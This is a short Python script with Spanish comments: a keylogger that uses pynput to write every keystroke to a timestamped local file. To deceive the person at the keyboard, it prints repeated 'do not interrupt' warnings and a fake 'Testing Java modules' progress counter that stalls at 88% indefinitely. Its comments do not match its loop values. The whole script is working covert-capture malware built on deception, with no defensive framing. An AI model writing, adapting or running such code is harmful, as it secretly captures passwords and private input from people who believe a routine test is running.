from pynput import keyboard
from datetime import datetime
import time
import threading
import sys

# Nombre del archivo basado en fecha y hora
start_time = datetime.now()
filename = start_time.strftime("results_%Y%m%d_%H%M%S.txt")

# Función para registrar teclas
def on_press(key):
    try:
        with open(filename, "a", encoding="utf-8") as f:
            f.write(f"{key.char}")
    except AttributeError:
        with open(filename, "a", encoding="utf-8") as f:
            f.write(f"[{key}]")

print(f"ADVERTENCIA IMPORTANTE: NO INTERRUMPIR ESTE PROCESO!!!")
print(f"ADVERTENCIA IMPORTANTE: NO INTERRUMPIR ESTE PROCESO!!!")
print(f"ADVERTENCIA IMPORTANTE: NO INTERRUMPIR ESTE PROCESO!!!")
# Función para simular progreso de test
def simular_test():
    for i in range(1, 88):  # Del 1% al 22%
        print(f"Testeando modulos Java... {i}% completo")
        time.sleep(100)  # 4 minutos = 240 segundos
    print("Testeando modulos Java... 88% completo")    
    while True:
        time.sleep(1)  # Espera infinita

# Hilo para mostrar progreso
progreso_thread = threading.Thread(target=simular_test)
progreso_thread.daemon = True
progreso_thread.start()

# Inicia listener de teclado
with keyboard.Listener(on_press=on_press) as listener:
    listener.join()
